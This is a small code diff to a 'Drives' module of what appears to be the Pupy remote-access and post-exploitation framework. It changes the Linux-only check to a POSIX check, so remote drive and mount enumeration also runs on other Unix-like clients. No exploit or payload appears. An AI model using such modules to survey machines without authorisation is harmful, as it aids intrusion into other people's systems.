@@ -30,7 +30,7 @@ class Drives(PupyModule):
                 self.client.conn.modules['pupwinutils.drives'].list_drives()
             )
 
-        elif self.client.is_linux():
+        elif self.client.is_posix():
             tier1 = ( 'network', 'fuse', 'dm', 'block' )
             rmount = self.client.conn.modules['mount']
             ros = self.client.conn.modules['os']
